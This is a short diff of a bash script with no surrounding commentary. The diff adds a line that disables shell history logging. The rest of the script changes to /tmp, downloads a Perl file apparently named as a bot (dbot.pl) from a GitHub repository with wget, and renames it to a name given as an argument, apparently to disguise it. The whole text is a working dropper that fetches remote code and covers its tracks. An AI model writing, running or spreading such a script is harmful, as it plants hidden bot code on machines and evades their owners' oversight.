@@ -1,4 +1,5 @@
 #!/usr/bin/bash
+unset HISTFILE
 cd /tmp
 wget https://raw.githubusercontent.com/TheDozer/thedozer/115066cc033336edfa5d920063f4659ab268ea08/dbot.pl
 mv dbot.pl $1
